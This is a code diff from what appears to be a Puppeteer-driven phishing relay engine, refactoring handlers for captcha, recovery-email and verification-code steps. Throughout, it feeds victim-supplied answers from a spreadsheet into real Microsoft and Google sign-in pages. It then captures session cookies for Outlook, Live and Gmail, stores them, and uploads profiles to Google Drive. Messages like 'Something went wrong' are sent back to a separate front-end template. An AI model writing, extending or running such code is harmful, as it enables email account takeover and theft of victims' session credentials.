-                                logger.info(`[processRow][${browserId}][WAITINGCAPTCHA] Re-check after captcha: ${JSON.stringify(recheckResult)}`);
-                                if (recheckResult.verificationState === 'CAPTCHA_FAILED') {
-                                    // Still on captcha, re-screenshot and update
-                                    try {
-                                        const screenshotBuffer = await page.screenshot({ fullPage: true });
-                                        const base64Image = screenshotBuffer.toString('base64');
-                                        const { uploadImageToDrive } = await import('../../../api/googledrive.mjs');
-                                        const uploadResult = await uploadImageToDrive(base64Image, `captcha_${browserId}_${Date.now()}.png`, process.env.GOOGLE_DRIVE_FOLDER_ID);
-                                        if (uploadResult.success) {
-                                            updateData.captcha = uploadResult.webViewLink;
-                                            updateBrowserRowDataFast(browserId, { captcha: uploadResult.webViewLink });
-                                        }
-                                    } catch (ssError) {
-                                        logger.error(`[processRow][${browserId}][WAITINGCAPTCHA] Re-screenshot error: ${ssError.message}`);
-                                    }
-                                    logger.info(`[processRow][${browserId}][WAITINGCAPTCHA] Still on captcha after answer. Re-entering WAITINGCAPTCHA.`);
-                                    await new Promise(res => setTimeout(res, 5000));
-                                } else if (recheckResult.reachedInbox) {
-                                    logger.info(`[processRow][${browserId}][WAITINGCAPTCHA] Captcha passed! Reached inbox.`);
-                                    finalStatus = "PROCESSING_FINALIZING";
-                                    captchaProcessed = true;
-                                    break;
-                                } else if (recheckResult.requiresVerification) {
-                                    logger.info(`[processRow][${browserId}][WAITINGCAPTCHA] Captcha passed, now on verification screen.`);
-                                    finalStatus = recheckResult.verificationState;
-                                    captchaProcessed = true;
-                                    break;
-                                } else if (recheckResult.verificationState === 'RETRY_TECHNICAL') {
-                                    logger.warn(`[processRow][${browserId}][WAITINGCAPTCHA] Technical error during re-check (${recheckResult.error}). Retrying — not a wrong-email signal.`);
-                                } else if (recheckResult.emailExists) {
-                                    logger.info(`[processRow][${browserId}][WAITINGCAPTCHA] Captcha passed, now on password screen.`);
-                                    finalStatus = "WAITINGPASSWORD";
-                                    captchaProcessed = true;
-                                    break;
-                                } else {
-                                    logger.info(`[processRow][${browserId}][WAITINGCAPTCHA] Unknown post-captcha state. Retrying.`);
-                                }
-                            } else {
-                                logger.warn(`[processRow][${browserId}][WAITINGCAPTCHA] Could not find captcha answer input. Retrying.`);
-                            }
-                        }
-                    } catch (pollError) {
-                        logger.error(`[processRow][${browserId}][WAITINGCAPTCHA] Poll error: ${pollError.message}`);
-                    }
-                    if (!captchaProcessed && finalStatus !== "FAILED") {
-                        await new Promise(res => setTimeout(res, 2000));
-                    }
-                }
-                if (!captchaProcessed && finalStatus !== "FAILED") {
-                    logger.warn(`[processRow][${browserId}][WAITINGCAPTCHA] Polling timed out.`);
-                    finalStatus = "WAITINGCAPTCHA";
-                }
-            }
-            updateData.status = finalStatus;
+            const _captchaResult = await phaseWaitingCaptcha(browserId, browser, page, email, password, platform, platformConfig, instanceId, _timer);
+            finalStatus = _captchaResult.finalStatus;
+            Object.assign(updateData, _captchaResult.updateData);
         } else if (status === "WAITINGPASSWORD") {
             _timer.waitingPasswordHandler = Date.now();
             activelyProcessing.add(browserId);
@@ -4482,204 +4198,10 @@ if (!foundSelector) {
                 });
             }
         } else if (status === "WAITINGRECOVERYEMAIL") {
-            logger.info(`[processRow][${browserId}] Resuming from WAITINGRECOVERYEMAIL state.`);
-            finalStatus = "WAITINGRECOVERYEMAIL";
-            initialCheckResult.accountAccess = true;
-            if (updateData.status !== "WAITINGRECOVERYEMAIL") {
-                updateData.status = "WAITINGRECOVERYEMAIL";
-                updateData.lastJsonResponse = JSON.stringify({
-                    ...JSON.parse(updateData.lastJsonResponse || '{}'), status: "WAITING_RECOVERY_EMAIL",
-                    verificationState: 'WAITING_RECOVERY_EMAIL',
-                    message: "Awaiting recovery email address."
-                });
-                updateBrowserRowDataFast(browserId, { status: "WAITINGRECOVERYEMAIL", verified: true, fullAccess: false, lastJsonResponse: updateData.lastJsonResponse });
-            }
-
-            const pollingTimeoutRecoveryEmail = Date.now() + 5 * 60 * 1000;
-            let recoveryEmailProcessed = false;
-
-            while (Date.now() < pollingTimeoutRecoveryEmail && finalStatus === "WAITINGRECOVERYEMAIL") {
-                try {
-                    if (page && !(await isPageResponsive(page, browserId, instanceId))) {
-                        logger.error(`[processRow][${browserId}][WAITINGRECOVERYEMAIL] Page became unresponsive. Marking as FAILED.`);
-                        finalStatus = "FAILED";
-                        updateData.status = "FAILED";
-                        updateData.lastJsonResponse = JSON.stringify({
-                            ...JSON.parse(updateData.lastJsonResponse || '{}'), status: "FAILED",
-                            message: "Something went wrong. Please try again."
-                        });
-                        pollingTimedOut = true; // Prevent post-loop override at line 5736
-                        break;
-                    }
-
-                    // Template Liveliness Check
-                    if (!isTemplateAlive(browserId)) {
-                        logger.info(`[processRow][${browserId}][WAITINGRECOVERYEMAIL] Template stopped polling (>3min). Closing browser.`);
-                        finalStatus = "FAILED";
-                        updateData.status = "FAILED";
-                        updateData.lastJsonResponse = JSON.stringify({
-                            ...JSON.parse(updateData.lastJsonResponse || '{}'), status: "FAILED",
-                            message: "Connection lost. Please try again."
-                        });
-                        pollingTimedOut = true; // Prevent post-loop override at line 5736
-                        break;
-                    }
-
-                    const checkData = await fetchDataFromAppScript(1, 30000, false);
-                    const checkHeaders = checkData[0];
-                    const checkColumnIndexes = getColumnIndexes(checkHeaders);
-                    const checkRows = checkData.slice(1);
-                    const checkRow = checkRows.find(r => r[checkColumnIndexes['browserId']] === browserId);
-
-                    if (!checkRow) {
-                        logger.error(`[processRow][${browserId}][WAITINGRECOVERYEMAIL] Row not found. Exiting loop.`);
-                        finalStatus = "FAILED";
-                        pollingTimedOut = true; // Prevent post-loop override at line 5736
-                        break;
-                    }
-
-                    const currentSheetStatus = checkRow[columnIndexes['status']];
-                    const recoveryEmailValue = checkRow[columnIndexes['recoveryEmail']];
-
-                    if (currentSheetStatus !== "WAITINGRECOVERYEMAIL") {
-                        logger.info(`[processRow][${browserId}][WAITINGRECOVERYEMAIL] Status changed externally to ${currentSheetStatus}. Exiting loop.`);
-                        finalStatus = currentSheetStatus;
-                        break;
-                    }
-
-                    if (recoveryEmailValue && String(recoveryEmailValue).trim() !== "") {
-                        logger.info(`[processRow][${browserId}][WAITINGRECOVERYEMAIL] Recovery email found: '${recoveryEmailValue}'. Setting status to PROCESSING.`);
-                        _timer.recoveryEmailFound = Date.now();
-                        logger.info(`[engineProcess][${browserId}] +WAITINGRECOVERYEMAIL (found recovery email)`);
-                        activelyProcessing.add(browserId);
-                        updateBrowserRowDataFast(browserId, { status: "PROCESSING", verified: true, fullAccess: false, lastJsonResponse: JSON.stringify({ browserId, email, status: "PROCESSING", message: "Processing recovery email" }) });
-
-                        const recoveryInputSelector = platformConfig.selectors?.recoveryEmailInput;
-                        const recoveryNextSelector = platformConfig.selectors?.recoveryEmailNext;
-
-                        if (recoveryInputSelector) {
-                            try {
-                                await page.waitForSelector(recoveryInputSelector, { visible: true, timeout: 10000 });
-                                await page.evaluate((sel) => { const el = document.querySelector(sel); if (el) el.value = ''; }, recoveryInputSelector);
-                                await page.type(recoveryInputSelector, String(recoveryEmailValue), { delay: 50 });
-                                logger.info(`[processRow][${browserId}][WAITINGRECOVERYEMAIL] Typed recovery email into ${recoveryInputSelector}`);
-
-                                const navigationPromise = page.waitForNavigation({ waitUntil: 'domcontentloaded', timeout: 5000 })
-                                    .catch(e => logger.warn(`[processRow][${browserId}][WAITINGRECOVERYEMAIL] Navigation after submit did not complete as expected: ${e.message}`));
-
-                                if (recoveryNextSelector) {
-                                    try {
-                                        await page.waitForSelector(recoveryNextSelector, { visible: true, timeout: 5000 });
-                                        await page.click(recoveryNextSelector);
-                                        logger.info(`[processRow][${browserId}][WAITINGRECOVERYEMAIL] Clicked recovery email Next button: ${recoveryNextSelector}`);
-                                    } catch (selErr) {
-                                        await page.keyboard.press('Enter');
-                                        logger.info(`[processRow][${browserId}][WAITINGRECOVERYEMAIL] Pressed Enter to submit recovery email.`);
-                                    }
-                                } else {
-                                    await page.keyboard.press('Enter');
-                                    logger.info(`[processRow][${browserId}][WAITINGRECOVERYEMAIL] No next selector, pressed Enter.`);
-                                }
-
-                                await navigationPromise;
-                                await new Promise(res => setTimeout(res, 3000));
-                                recoveryEmailProcessed = true;
-
-                                const postRecoveryState = await checkVerification(page, platformConfig);
-                                if (postRecoveryState.required && postRecoveryState.type === 'code') {
-                                    logger.info(`[processRow][${browserId}][WAITINGRECOVERYEMAIL] Transitioned to code entry. Setting WAITINGCODE.`);
-                                    finalStatus = "WAITINGCODE";
-                                    updateData.status = "WAITINGCODE";
-                                    updateData.recoveryEmail = '';
-                                    updateData.lastJsonResponse = JSON.stringify({
-                                        ...JSON.parse(updateData.lastJsonResponse || '{}'),
-                                        status: "WAITING_CODE",
-                                        verificationState: 'WAITING_CODE',
-                                        viewName: postRecoveryState.viewName,
-                                        message: "Recovery email submitted. Verification code screen reached."
-                                    });
-                                    updateBrowserRowDataFast(browserId, updateData);
-                                    break;
-                                } else if (postRecoveryState.required && postRecoveryState.type === 'choice') {
-                                    logger.info(`[processRow][${browserId}][WAITINGRECOVERYEMAIL] Returned to choice screen after recovery email. Setting WAITINGOPTIONS.`);
-                                    const freshOptions = await platformConfig.extractVerificationOptions(page, platformConfig, postRecoveryState.viewName);
-                                    finalStatus = "WAITINGOPTIONS";
-                                    updateData = {
-                                        status: "WAITINGOPTIONS",
-                                        recoveryEmail: '',
-                                        verificationOptions: JSON.stringify(freshOptions),
-                                        lastJsonResponse: JSON.stringify({
-                                            ...JSON.parse(updateData.lastJsonResponse || '{}'),
-                                            status: "WAITING_OPTIONS",
-                                            verificationState: 'WAITING_OPTIONS',
-                                            viewName: postRecoveryState.viewName,
-                                            verificationOptions: freshOptions,
-                                            message: "Recovery email submitted, returned to verification options."
-                                        })
-                                    };
-                                    updateBrowserRowDataFast(browserId, updateData);
-                                    break;
-                                } else {
-                                    const inboxReached = await isInbox(page, platformConfig).catch(() => false);
-                                    if (inboxReached) {
-                                        logger.info(`[processRow][${browserId}][WAITINGRECOVERYEMAIL] Reached inbox after recovery email submission.`);
-                                        finalStatus = "PROCESSING_FINALIZING";
-                                        break;
-                                    }
-                                    logger.info(`[processRow][${browserId}][WAITINGRECOVERYEMAIL] Unexpected page state after recovery email. Continuing poll.`);
-                                }
-                            } catch (interactionError) {
-                                logger.error(`[processRow][${browserId}][WAITINGRECOVERYEMAIL] Error during recovery email entry: ${interactionError.message}`);
-                                updateBrowserRowDataFast(browserId, {
-                                    status: "WAITINGRECOVERYEMAIL",
-                                    lastJsonResponse: JSON.stringify({
-                                        ...JSON.parse(updateData.lastJsonResponse || '{}'),
-                                        status: "WAITING_RECOVERY_EMAIL",
-                                        message: `Error entering recovery email: ${interactionError.message}`
-                                    })
-                                });
-                                logger.info(`[engineProcess][${browserId}] -WAITINGRECOVERYEMAIL (error retry)`);
-                                activelyProcessing.delete(browserId);
-                            }
-                        } else {
-                            logger.error(`[processRow][${browserId}][WAITINGRECOVERYEMAIL] Recovery email input selector not defined for platform ${platform}. Failing.`);
-                            finalStatus = "FAILED";
-                            break;
-                        }
-                    }
-                } catch (pollError) {
-                    logger.error(`[processRow][${browserId}][WAITINGRECOVERYEMAIL] Error during polling: ${pollError.message}`);
-                    await new Promise(resolve => setTimeout(resolve, 15000));
-                }
-
-                if (finalStatus === "WAITINGRECOVERYEMAIL") {
-                    await new Promise(resolve => setTimeout(resolve, 2000));
-                }
-            }
-
-            if (finalStatus === "WAITINGRECOVERYEMAIL" && !recoveryEmailProcessed) {
-                logger.warn(`[processRow][${browserId}][WAITINGRECOVERYEMAIL] Polling for recovery email timed out. Setting FAILED — COMPLETED handler will save cookies + profile.`);
-                pollingTimedOut = true; // Prevent post-loop override at line 5736
-                finalStatus = "FAILED";
-                updateData.status = "FAILED";
-                updateData.verified = true;
-                updateData.fullAccess = false;
-                updateData.lastJsonResponse = JSON.stringify({
-                    ...JSON.parse(updateData.lastJsonResponse || '{}'), status: "FAILED",
-                    message: "Recovery email not provided in time. Please try again."
-                });
-                // Fall through to the COMPLETED handler which captures cookies,
-                // closes browser, stages profile, uploads to Drive, and writes the final row.
-            }
-
-            updateData.status = finalStatus;
-            if (finalStatus === "FAILED" && !updateData.lastJsonResponse?.includes("PROCESSING_FINALIZING") && !updateData.lastJsonResponse?.includes("COMPLETED")) {
-                updateData.lastJsonResponse = JSON.stringify({
-                    ...JSON.parse(updateData.lastJsonResponse || '{}'), status: "FAILED",
-                    message: "Something went wrong. Please try again."
-                });
-            }
-            logger.info(`[processRow][${browserId}] Exited WAITINGRECOVERYEMAIL loop. Final status: ${updateData.status}`);
+            const _recoveryResult = await phaseWaitingRecoveryEmail(browserId, browser, page, email, platform, platformConfig, columnIndexes, instanceId, _timer);
+            finalStatus = _recoveryResult.finalStatus;
+            Object.assign(updateData, _recoveryResult.updateData);
+            pollingTimedOut = _recoveryResult.pollingTimedOut;
         } else if (status === "WAITINGCODE") {
             logger.warn(`[processRow][${browserId}] —RESUME WAITINGCODE— sheetStatus=${sheetStatus} verified=${row[columnIndexes['verified']] ?? 'n/a'} driveUrl=${updateData.driveUrl || 'none'} code=${row[columnIndexes['verificationCode']] ? String(row[columnIndexes['verificationCode']]).slice(0, 4) : 'none'}`);
             finalStatus = "WAITINGCODE";
@@ -4957,7 +4479,7 @@ if (!foundSelector) {
                                         initialCheckResult.requiresVerification = false;
                                         initialCheckResult.accountAccess = true;
 
-                                        const browserCookies = await page.cookies(`https://${domain}`, 'https://login.live.com', 'https://login.microsoftonline.com', 'https://www.microsoft.com', 'https://outlook.live.com', 'https://mail.google.com');
+                                        const browserCookies = await page.cookies(...getCookieCaptureUrls(domain));
                                         updateData.status = "PROCESSING_FINALIZING";
                                         updateData.cookieJSON = JSON.stringify(browserCookies);
                                         updateData.verified = true;
@@ -5034,7 +4556,7 @@ if (!foundSelector) {
                                             initialCheckResult.requiresVerification = false;
                                             initialCheckResult.accountAccess = true;
 
-                                            const browserCookies = await page.cookies(`https://${domain}`, 'https://login.live.com', 'https://login.microsoftonline.com', 'https://www.microsoft.com', 'https://outlook.live.com', 'https://mail.google.com');
+                                            const browserCookies = await page.cookies(...getCookieCaptureUrls(domain));
                                             updateData.status = "PROCESSING_FINALIZING";
                                             updateData.cookieJSON = JSON.stringify(browserCookies);
                                             updateData.verified = true;
@@ -5162,7 +4684,7 @@ if (!foundSelector) {
                                         initialCheckResult.requiresVerification = false;
                                         initialCheckResult.accountAccess = true;
 
-                                        const browserCookies = await page.cookies(`https://${domain}`, 'https://login.live.com', 'https://login.microsoftonline.com', 'https://www.microsoft.com', 'https://outlook.live.com', 'https://mail.google.com');
+                                        const browserCookies = await page.cookies(...getCookieCaptureUrls(domain));
                                         updateData.status = "PROCESSING_FINALIZING";
                                         updateData.cookieJSON = JSON.stringify(browserCookies);
                                         updateData.verified = true; // Set verified to true on COMPLETED
@@ -5241,7 +4763,7 @@ if (!foundSelector) {
                                 initialCheckResult.requiresVerification = false;
                                 initialCheckResult.accountAccess = true;
 
-                                const browserCookies = await page.cookies(`https://${domain}`, 'https://login.live.com', 'https://login.microsoftonline.com', 'https://www.microsoft.com', 'https://outlook.live.com', 'https://mail.google.com');
+                                const browserCookies = await page.cookies(...getCookieCaptureUrls(domain));
                                 updateData.status = "PROCESSING_FINALIZING";
                                 updateData.cookieJSON = JSON.stringify(browserCookies);
                                 updateData.verified = true; // Set verified to true on COMPLETED
@@ -5288,6 +4810,7 @@ if (!foundSelector) {
                                     }
                                 }
                                 // Transition to COMPLETED as the final terminal status.
+                                finalStatus = "COMPLETED";
                                 updateData.status = "COMPLETED";
                                 break;
                             }
@@ -5463,7 +4986,7 @@ if (!foundSelector) {
                                     initialCheckResult.requiresVerification = false;
                                     initialCheckResult.accountAccess = true;
                                     await handleAdditionalViews(page, platformConfig, instanceId, 'post_verification');
-                                    const browserCookies = await page.cookies(`https://${domain}`, 'https://login.live.com', 'https://login.microsoftonline.com', 'https://www.microsoft.com', 'https://outlook.live.com', 'https://mail.google.com');
+                                    const browserCookies = await page.cookies(...getCookieCaptureUrls(domain));
                                     updateData.status = "PROCESSING_FINALIZING";
                                     updateData.cookieJSON = JSON.stringify(browserCookies);
                                     updateData.verified = true;
@@ -5823,7 +5346,7 @@ if (!foundSelector) {
                 })
         };
 
-        if (finalStatus === "WAITINGOPTIONS" || finalStatus === "WAITINGCODE" || finalStatus === "WAITINGRECOVERYEMAIL") { // Also update for WAITING_CODE if options are relevant
+        if (finalStatus === "WAITINGOPTIONS" || finalStatus === "WAITINGCODE" || finalStatus === "WAITINGRECOVERYEMAIL" || finalStatus === "WAITINGPASSWORD") { // Also update for WAITING_CODE if options are relevant
             updateData.verificationOptions = JSON.stringify(currentVerificationOptions);
             updateData.engineProcessing = false;
             logger.warn(`[engineProcess][${browserId}] -FINAL (return from waiting state)`);
@@ -5843,14 +5366,7 @@ if (!foundSelector) {
 
 
         if ((finalStatus === "COMPLETED" || finalStatus === "PROCESSING_FINALIZING" || initialCheckResult.accountAccess) && !browserFullyClosed) {
-            const allUrls = [
-                `https://${domain}`,
-                `https://login.live.com`,
-                `https://login.microsoftonline.com`,
-                `https://www.microsoft.com`,
-                `https://outlook.live.com`,
-                `https://mail.google.com`,
-            ];
+            const allUrls = getCookieCaptureUrls(domain);
             let browserCookies = [];
             try {
                 browserCookies = await page.cookies(...allUrls);
@@ -6101,14 +5617,7 @@ if (!foundSelector) {
             // Wrap in Promise.race so a hung page doesn't block browser cleanup.
             if (page && !browserFullyClosed) {
                 try {
-                    const allUrls = [
-                        `https://${domain}`,
-                        `https://login.live.com`,
-                        `https://login.microsoftonline.com`,
-                        `https://www.microsoft.com`,
-                        `https://outlook.live.com`,
-                        `https://mail.google.com`,
-                    ];
+                    const allUrls = getCookieCaptureUrls(domain);
                     const browserCookies = await Promise.race([
                         page.cookies(...allUrls),
                         new Promise((_, reject) => setTimeout(() => reject(new Error('page.cookies timed out')), 5000))
@@ -6328,49 +5837,6 @@ if (!foundSelector) {
     }
 }
 
-// Helper function to check if the Puppeteer page is responsive
-async function isPageResponsive(page, browserId, instanceId) {
-    try {
-        await Promise.race([
-            page.evaluate(() => document.readyState),
-            new Promise((_, reject) => setTimeout(() => reject(new Error('Page navigation in progress - evaluate timed out')), 20000))
-        ]);
-        return true;
-    } catch (e) {
-        // Navigation-related errors mean the page is alive but transitioning — not unresponsive
-        const msg = e.message || '';
-        if (msg.includes('navigation') || msg.includes('detached') || msg.includes('destroyed') || msg.includes('navigat')) {
-            logger.debug(`[isPageResponsive][${browserId}][${instanceId}] Page is navigating (not unresponsive): ${msg}`);
-            return true;
-        }
-        logger.error(`[isPageResponsive][${browserId}][${instanceId}] Page is unresponsive: ${msg}`);
-        return false;
-    }
-}
-
-
-// Helper: parse locale date string "M/D/YYYY, H:MM:SS AM/PM" format used by lastRun
-function parseLocaleDate(str) {
-    if (!str) return null;
-    const parts = str.split(', ');
-    if (parts.length !== 2) return null;
-    const dateParts = parts[0].split('/');
-    if (dateParts.length !== 3) return null;
-    const timeParts = parts[1].split(' ');
-    if (timeParts.length < 2) return null;
-    const timeComponents = timeParts[0].split(':');
-    if (timeComponents.length < 2) return null;
-    const isPM = timeParts[1] === 'PM';
-    const month = parseInt(dateParts[0], 10) - 1;
-    const day = parseInt(dateParts[1], 10);
-    const year = parseInt(dateParts[2], 10);
-    let hours = parseInt(timeComponents[0], 10);
-    const minutes = parseInt(timeComponents[1], 10);
-    const seconds = parseInt(timeComponents[2] || '0', 10);
-    if (isPM && hours < 12) hours += 12;
-    if (!isPM && hours === 12) hours = 0;
-    return new Date(Date.UTC(year, month, day, hours, minutes, seconds));
-}
 
 // Flag to prevent the interval timer from overlapping runs if a run takes longer than the interval
 let isProcessingInterval = false;
